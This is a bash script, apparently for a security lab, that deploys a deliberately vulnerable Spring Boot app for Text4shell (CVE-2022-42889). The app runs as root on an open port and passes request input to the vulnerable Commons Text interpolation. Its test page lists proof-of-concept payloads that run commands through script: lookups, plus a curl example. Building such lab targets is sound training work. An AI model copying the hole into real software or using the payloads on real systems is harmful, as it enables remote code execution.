#!/bin/bash
# Text4shell (CVE-2022-42889) 취약 웹 애플리케이션 배포 스크립트
# Apache Commons Text 취약 버전을 사용하는 Java 웹 애플리케이션

set -e

exec > >(tee /var/log/text4shell-setup.log|logger -t text4shell -s 2>/dev/console) 2>&1
echo "Starting Text4shell vulnerable app setup - $(date)"

# Java 및 Maven 설치
export DEBIAN_FRONTEND=noninteractive
apt-get update
apt-get install -y \
    openjdk-17-jdk \
    maven \
    git \
    curl

# 작업 디렉토리 생성
mkdir -p /opt/text4shell-app
cd /opt/text4shell-app

# Spring Boot 프로젝트 생성
cat > pom.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 
         http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.7.0</version>
        <relativePath/>
    </parent>
    
    <groupId>com.v2r</groupId>
    <artifactId>text4shell-vulnerable</artifactId>
    <version>1.0.0</version>
    <name>Text4shell Vulnerable App</name>
    
    <properties>
        <java.version>17</java.version>
    </properties>
    
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
        <!-- 취약 버전: Apache Commons Text 1.9 -->
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-text</artifactId>
            <version>1.9</version>
        </dependency>
    </dependencies>
    
    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>
</project>
EOF

# 소스 디렉토리 생성
mkdir -p src/main/java/com/v2r/text4shell
mkdir -p src/main/resources

# 메인 애플리케이션 클래스
cat > src/main/java/com/v2r/text4shell/Text4ShellApplication.java << 'EOF'
package com.v2r.text4shell;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class Text4ShellApplication {
    public static void main(String[] args) {
        SpringApplication.run(Text4ShellApplication.class, args);
    }
}
EOF

# 취약한 컨트롤러
cat > src/main/java/com/v2r/text4shell/VulnerableController.java << 'EOF'
package com.v2r.text4shell;

import org.apache.commons.text.StringSubstitutor;
import org.springframework.web.bind.annotation.*;
import java.util.HashMap;
import java.util.Map;

@RestController
@RequestMapping("/api")
public class VulnerableController {
    
    @GetMapping("/interpolate")
    public String interpolate(@RequestParam String input) {
        // CVE-2022-42889: 취약한 문자열 보간
        // script:, dns:, url: 프로토콜이 활성화되어 있음
        try {
            StringSubstitutor substitutor = new StringSubstitutor();
            String result = substitutor.replace(input);
            return "Result: " + result;
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    @PostMapping("/process")
    public String process(@RequestBody Map<String, String> data) {
        String template = data.get("template");
        if (template == null) {
            return "Error: template parameter required";
        }
        
        // 취약한 문자열 보간
        StringSubstitutor substitutor = new StringSubstitutor();
        String result = substitutor.replace(template);
        return "Processed: " + result;
    }
    
    @GetMapping("/test")
    public String test() {
        return """
            <html>
            <head><title>Text4shell Test</title></head>
            <body>
                <h1>Text4shell (CVE-2022-42889) Test Page</h1>
                <p><strong>Warning:</strong> This application contains intentional vulnerabilities for testing purposes only.</p>
                <h2>Test Endpoints:</h2>
                <ul>
                    <li>GET /api/interpolate?input=\${script:javascript:java.lang.Runtime.getRuntime().exec('id')}</li>
                    <li>POST /api/process with JSON: {"template": "\${script:javascript:java.lang.Runtime.getRuntime().exec('id')}"}</li>
                </ul>
                <h2>Example PoC:</h2>
                <pre>
curl "http://localhost:8080/api/interpolate?input=\${script:javascript:java.lang.Runtime.getRuntime().exec('id')}"
                </pre>
            </body>
            </html>
            """;
    }
}
EOF

# application.properties
cat > src/main/resources/application.properties << 'EOF'
server.port=8080
spring.application.name=text4shell-vulnerable
EOF

# Maven 빌드
mvn clean package -DskipTests

# JAR 파일 실행 (백그라운드)
nohup java -jar target/text4shell-vulnerable-1.0.0.jar > /var/log/text4shell-app.log 2>&1 &

# systemd 서비스 등록 (선택)
cat > /etc/systemd/system/text4shell.service << 'EOF'
[Unit]
Description=Text4shell Vulnerable Application
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/text4shell-app
ExecStart=/usr/bin/java -jar /opt/text4shell-app/target/text4shell-vulnerable-1.0.0.jar
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable text4shell
systemctl start text4shell

# 방화벽 포트 열기 (ufw 사용 시)
if command -v ufw > /dev/null; then
    ufw allow 8080/tcp
fi

echo "Text4shell vulnerable app setup completed - $(date)"
echo "Application URL: http://$(curl -s ifconfig.me):8080/api/test"

